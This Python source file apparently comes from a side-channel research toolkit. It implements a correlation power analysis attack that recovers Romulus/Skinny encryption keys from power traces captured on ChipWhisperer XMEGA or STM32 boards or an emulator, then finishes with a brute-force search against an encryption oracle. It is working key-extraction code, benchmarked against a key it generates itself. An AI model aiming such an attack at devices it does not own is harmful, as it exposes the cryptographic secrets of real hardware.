import sys

from typing import Optional

import lascar
import itertools

from tqdm import tqdm

from .classifiers import round_2_model, round_1_model, compute_initial_state
from .constants import NP_TWEAKEY_P
import numpy as np

from util import constants


def attack(traces_source, verifier_enc, load_from, save_to, args, wrap=None):
    """Initialize the attack depending on the target platform and arguments"""
    print("Generating a random key to attack...")
    key = np.random.randint(0, 256, 16, np.uint8).tobytes()
    print("The key is:", key.hex())

    get_num_samples = lambda x: x
    thresholds = None
    threshold = 0.5

    if args.num_traces is not None and args.num_traces > 0:
        print(f"INFO: overriding number of traces to {args.num_traces}")
        get_num_samples = lambda _: args.num_traces

    if load_from:
        capture_fn = lambda: print("FATAL: called capture but load_from is present. This should not happen")
        enc_oracle_fn = lambda nonce, pt: print("FATAL: called oracle but load_from is present. This should not happen")

        threshold = 0.3 if traces_source == 'stm32' else 0.6
        if traces_source == 'stm32':
            thresholds = [0.20 if i == 5 else 0.35 for i in range(8)]
    elif traces_source == 'xmega':
        from attacks.romulus.runners.cw_xmega import capture_traces as capture
        from attacks.romulus.runners.cw_xmega import encrypt as enc

        capture_fn = lambda: capture(key, n_samples=get_num_samples(600))
        enc_oracle_fn = lambda nonce, pt: enc(key, pt, nonce)

    elif traces_source == 'stm32':
        if wrap is not None:
            def capture(key, n_samples):
                return wrap.capture_traces(key, n_samples, cap_num_windows=1, cap_first_offset=0)

            def enc(key, plaintext, nonce=None, ad=''):
                return wrap.encrypt(key, plaintext, nonce, ad)

        else:
            from attacks.romulus.runners.cw_arm import encrypt as enc
            from attacks.romulus.runners.cw_arm import capture_traces as capture

        enc_oracle_fn = lambda nonce, pt: enc(key, pt, nonce)
        capture_fn = lambda: capture(key, n_samples=get_num_samples(2000))

        threshold = 0.3
        thresholds = [0.20 if i == 5 else 0.35 for i in range(8)]
    elif traces_source == 'emulator':
        from attacks.romulus.runners.emulator import capture_traces as capture
        from attacks.romulus.runners.emulator import encrypt as enc

        capture_fn = lambda: capture(key, n_samples=get_num_samples(500), instr_count=30000)
        enc_oracle_fn = lambda nonce, pt: enc(key, pt, nonce)

        threshold = 0.5
    else:
        sys.exit(0)

    if verifier_enc == 'xmega':
        from attacks.romulus.runners.cw_xmega import encrypt as enc
        enc_fn = enc
    elif verifier_enc == 'stm32':
        from attacks.romulus.runners.cw_arm import encrypt as enc
        enc_fn = enc
    elif verifier_enc == 'emulator':
        from attacks.romulus.runners.emulator import encrypt as enc
        enc_fn = enc
    elif verifier_enc == 'native':
        from attacks.romulus.runners.native import encrypt as enc
        enc_fn = enc
    else:
        sys.exit(0)

    if args.threshold is not None and args.threshold > 0:
        print(f"INFO: overriding threshold from {threshold} to {args.threshold}")
        threshold = args.threshold

    found_key, real_key, num_iterations = _attack(capture_fn, enc_oracle_fn, enc_fn, threshold, load_from, save_to, real_key=key,
                                                  thresholds=thresholds, faster_first_subkey=args.faster_first_subkey if args.faster_first_subkey is not None else False)

    # Has the function returned a new real key? (loaded from a previous run)
    key = real_key if real_key is not None else key
    print("-- Results")
    print("Real :", key.hex(sep=' ', bytes_per_sep=4))

    if found_key is not None:
        print("Found:", found_key.hex(sep=' ', bytes_per_sep=4))

        if found_key.hex() == key.hex():
            return constants.STATUS_FOUND, num_iterations
        return constants.STATUS_WRONG_KEY, num_iterations
    else:
        print("No key found :(")
        return constants.STATUS_NOT_FOUND, num_iterations


def _attack(capture, enc_oracle, enc, threshold, load_from=None, save_to=None, real_key=None, thresholds=None, fail_fast=False, faster_first_subkey=False) \
        -> tuple[Optional[bytes], Optional[bytes], int]:
    """Execute the attack"""

    if load_from is None:
        # Capture the power traces from the board
        print("Step 1: acquire traces")

        container = capture()

        # Compute the initial state of Skinny, as it can depend on the nonce depending on the chosen attack point
        v = container.values
        new_v = []
        for index, arr in enumerate(v):
            if len(arr) != 2:
                # No AD, fallback
                nonce = arr
                iv = compute_initial_state(np.zeros(16, np.uint8), np.zeros(16, np.uint8))
            else:
                nonce, ad = arr
                a0 = ad[:16]
                a1 = ad[16:]
                iv = compute_initial_state(a0, a1)

            # set the user value to (nonce, initial vector)
            new_v.append((nonce, iv))

        container.values = np.array(new_v)


        nonce = b'\x00' * 16
        oracle = enc_oracle(nonce, '')

        if save_to is not None:
            from util.file_utils import save
            save(save_to, real_key, container.values, container.leakages, nonce, oracle)
    else:
        print("Step 1: loading traces")
        from util.file_utils import load
        from lascar import TraceBatchContainer

        result = load(load_from)
        container = TraceBatchContainer(np.array(result["traces"]), np.array(result["inputs"]))
        nonce = result["pt"]
        oracle = result["ct"]
        real_key = result["key"]

        print("\tLoaded key is", real_key.hex())

    print("Step 2: find candidates for the 8 first bytes")
    # get the 16 most likely propositions for each of the 8 first bytes of the key
    # in practice, the correct solution is almost always in the first 8, but we never know
    start = _find_first_half_candidates(container, keep_N=32, real_key=real_key, fail_fast=fail_fast)

    if start is None:
        return None, real_key, 0

    print("Step 3: find candidates for the 8 last bytes")
    # the wrong solutions in start will cause the next bytes to be wrong ==> the correlation will be very low (< 0.5)
    # this means we can filter out the bad solutions for the 8 first bytes and find the last 8 bytes at the same time
    # the last 8 bytes are usually right the first time, but if needed we can return 2-3 propositions for each byte
    # this would give a number of keys of just 8^2 or 8^3, i.e. 2^6 or 2^9, which could then be tested by bruteforce
    wrong_elements = range(8)
    end = None
    selected_key_bytes = [0 for _ in range(8)]
    num_iterations = 0  # for benchmarking
    while len(wrong_elements) != 0:
        num_iterations += 1
        # determine key
        key = bytes([x[selected_key_bytes[i]] for i, x in enumerate(start)])

        print("Starting! wrongs=", wrong_elements, "selected_key_bytes=", selected_key_bytes, "key=", key.hex())

        end, wrong_elements = _find_second_half_candidates(container, key_start=key, keep_N=10, real_key=real_key,
                                                           correlation_threshold=threshold, thresholds=thresholds)
        print("Done! n_wrongs=", wrong_elements)

        if len(wrong_elements) > 0:
            if faster_first_subkey:
                # update wrong key byte in one quarter of the key
                if wrong_elements[0] < 4:
                    for wrong_element in wrong_elements: 
                        if wrong_element < 4: selected_key_bytes[wrong_element] += 1
                else:
                    for wrong_element in wrong_elements: 
                        selected_key_bytes[wrong_element] += 1
            else:
                # update first wrong key byte
                selected_key_bytes[wrong_elements[0]] += 1

            if selected_key_bytes[wrong_elements[0]] >= len(start[wrong_elements[0]]):
                print("Cannot find a key. One byte is probably incorrect in the 8 first bytes.")
                return None, real_key, num_iterations

    key_start = bytes([x[selected_key_bytes[i]] for i, x in enumerate(start)])

    print("Step 4: find the final key")
    test_fn = lambda k: enc(k, '', nonce) == oracle

    # Test the vector we found
    test_key = key_start + bytes([x[0] for x in end])
    found_key = None
    keep_N_vect = [2, 2, 4, 4, 2, 2, 10, 2]
    if test_fn(test_key):
        found_key = test_key

    for max_wrong_bytes in range(8):
        # which byte will we check
        selection_vectors = itertools.combinations(range(8), max_wrong_bytes)

        for sel_vector in tqdm(selection_vectors):
            if sel_vector == (): continue
            values_vector_partial = itertools.product(*[range(keep_N_vect[i]) for i in sel_vector])  # itertools.combinations_with_replacement(range(4), max_wrong_bytes)

            for value_vector in values_vector_partial:
                sel = []
                for i in range(8):
                    if i in sel_vector:
                        index = sel_vector.index(i)
                        sel.append(end[i][value_vector[index]])
                    else:
                        sel.append(end[i][0])
                key = key_start + bytes(sel)

                for retries in range(10):
                    try:
                        if test_fn(key):
                            found_key = key
                        break
                    except AttributeError:
                        print("\t\tAttempt", retries+1, "failed, retrying...")
                        pass

                if found_key is not None: break
            if found_key is not None: break
        if found_key is not None: break

    return found_key, real_key, num_iterations


def _process_results(results, keep_N, correlation_threshold=0, thresholds=None):
    """
    Given the results of the CPA, output an array of arrays sorted by most likely candidate first and an array of
    likely incorrect bytes
    """
    possible_keys = []
    likely_wrong = set()

    # plot(results[0])

    for index, r in enumerate(results):
        r = abs(r)
        rMax = r.max(1)

        # did not reach the threshold, it's likely that something went wrong
        # (for example, the key used in a previous step was incorrect)
        threshold = thresholds[index] if thresholds is not None else correlation_threshold
        print("\t\tbyte", index, ": correlation max", rMax.max(), "mean", rMax.mean(), "thresh", threshold)

        if rMax.max() < threshold:
            likely_wrong.add(index)

        possible_keys.append(rMax.argsort()[::-1][:keep_N])

    return possible_keys, likely_wrong


def _find_second_half_candidates(container, key_start: bytes, keep_N, correlation_threshold, real_key=None,
                                 bytes_to_search=range(8), thresholds=None):
    eng = [
        lascar.CpaEngine(f'cpa{byte}',
                         lambda nonce, guess, index=byte: round_2_model(nonce, guess, index, key_start),
                         range(256))
        for byte in bytes_to_search
    ]
    lascar.Session(container, engines=eng).run(batch_size="auto")
    results = [engine.finalize() for engine in eng]
    possible_keys, wrongs = _process_results(results, keep_N, correlation_threshold, thresholds)
    reorder = [[] for _ in range(8)]

    # for the last 4 bytes of the key, we don't use exactly key[index + 4] but key[(index + 2) % 4 + 4]
    nwrongs = []
    for i in range(4, 8):
        if i in wrongs:
            nwrongs.append((i + 2) % 4 + 4)
            wrongs.remove(i)
    for i in nwrongs: wrongs.add(i)
    wrongs = sorted(wrongs)

    for pos, i in enumerate(bytes_to_search):
        if pos in wrongs:
            print("WARNING: likely wrong value for byte", i, "of the key start (affects byte", NP_TWEAKEY_P[i],
                  "of the rest)")
        reorder[NP_TWEAKEY_P[i] - 8] = possible_keys[pos]
    # while -1 in reorder: reorder.remove(-1)

    if real_key is not None:
        for index, r in enumerate(reorder):
            print("Possibilities for byte", index + 8, [hex(x) for x in r])
            print("Actual               :", hex(real_key[index + 8]), "\tin possibilities?", real_key[index + 8] in r)

    return reorder, wrongs


def _find_first_half_candidates(container, keep_N, real_key=None, fail_fast=False):
    eng = [
        lascar.CpaEngine(f'cpa{byte}',
                         lambda nonce, guess, index=byte: round_1_model(nonce, guess, index),
                         range(256))
        for byte in range(8)
    ]
    lascar.Session(container, engines=eng).run(batch_size="auto")
    results = [engine.finalize() for engine in eng]
    possible_keys, _ = _process_results(results, keep_N)

    if real_key is not None:
        for index, r in enumerate(possible_keys):
            print("Possibilities for byte", index, [hex(x) for x in r])
            print("Actual               :", hex(real_key[index]), "\tin possibilities?", real_key[index] in r)

            if fail_fast and real_key[index] not in r:
                print("Fail fast.")
                return None

    return possible_keys


if __name__ == "__main__":
    print("Please use the main script.")
    sys.exit(0)
